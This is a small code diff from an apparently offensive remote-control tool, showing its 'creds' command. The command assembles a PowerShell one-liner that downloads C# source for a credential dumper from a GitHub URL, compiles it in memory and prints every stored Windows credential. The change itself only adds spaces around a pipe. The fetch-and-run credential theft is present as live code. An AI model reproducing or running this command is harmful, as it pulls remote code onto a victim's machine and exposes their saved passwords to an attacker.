@@ -347,7 +347,7 @@ while not stop:
         elif ducky_command[:5] == "creds":
             commands = []
             commands.append("(add-type -typedefinition (new-object net.webclient).downloadstring(\"http://raw.githubusercontent.com/computer-geek64/ducky/master/dependencies/dump-creds.cs\") -language csharp -passthru)>$null")
-            commands.append("([credential]::loadall()|out-string).trim()")
+            commands.append("([credential]::loadall() | out-string).trim()")
             stdin = "; ".join(commands)
         else:
             print("Ducky command not recognized: \"" + ducky_command + "\"")
